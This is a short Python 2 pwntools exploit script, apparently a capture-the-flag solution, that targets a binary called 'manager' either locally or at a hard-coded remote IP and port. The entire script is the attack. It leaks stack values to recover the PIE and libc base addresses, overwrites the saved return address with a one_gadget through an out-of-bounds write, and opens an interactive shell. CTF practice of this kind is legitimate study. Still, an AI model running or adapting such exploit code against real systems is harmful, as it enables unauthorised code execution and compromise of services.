#!/usr/bin/python2
from pwn import *
from sys import *

if(len(argv) == 2):
	p = connect("165.227.225.92", 30541)
	offset___libc_start_main_ret = 0x270b3
	offset_system = 0x0000000000055410
	offset_dup2 = 0x0000000000111a30
	offset_read = 0x0000000000111130
	offset_write = 0x00000000001111d0
	offset_str_bin_sh = 0x1b75aa
	offset_puts = 0x00000000000875a0

else:
	p = process('./manager')
	offset___libc_start_main_ret = 0x270b3
	offset_system = 0x0000000000055410
	offset_dup2 = 0x0000000000111a30
	offset_read = 0x0000000000111130
	offset_write = 0x00000000001111d0
	offset_str_bin_sh = 0x1b75aa

context.arch = "amd64"
cmd = """
b *{}
""".format(0x0000555555554000+0x000000000000137C)

if(len(argv) == 3):
	gdb.attach(p, cmd)

def leak(where):
	p.sendline("1")
	p.sendline(str(where))
	p.recvuntil("Rate: ")
	rate = eval(p.recvline())<< 32 
	p.recvuntil("week: ")
	week = eval(p.recvline())
	
	return rate + week

def fill(where, data):
	p.sendline("2")	
	p.sendline(str(where))	
	print hex(data & 0xffffffff)
	p.sendline(str(data & 0xffffffff))	
	print hex(data >> 32)
	p.sendline(str(data >> 32))	
	return 0

rip = leak(7)
pie = leak(11) - 0x000000000000122F
main = pie + 0x000000000000122F

print "libcdb + rip",hex(rip)
print "pie",hex(pie)
poprdi = 0x00000000000013db
ret = 0x0000000000001016

payload = ""
base = rip - offset___libc_start_main_ret

# got from one_gadget
magic = 0xe6c84
puts = 0x0000000000001030 + pie
fill(7, base + 0xe6c84)
p.sendline("3")
p.interactive()